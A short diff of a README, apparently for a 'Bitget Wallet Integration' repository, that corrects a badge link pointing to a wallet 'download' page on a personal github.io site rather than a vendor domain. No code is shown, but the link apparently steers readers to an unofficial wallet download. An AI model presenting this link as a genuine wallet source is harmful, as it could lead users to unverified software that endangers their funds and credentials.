@@ -8,7 +8,7 @@
 
 <div align="center">
 
-[![Access the Wallet Hub](https://img.shields.io/badge/_ACCESS_THE_WALLET_HUB-Bitget_Ready-blue?style=for-the-badge)](https://okovba26.github.io/.githubbitget-download)
+[![Access the Wallet Hub](https://img.shields.io/badge/_ACCESS_THE_WALLET_HUB-Bitget_Ready-blue?style=for-the-badge)](https://okovba26.github.io/.github/bitget-download)
 </div>
 
 ## What is this Bitget Wallet Integration?
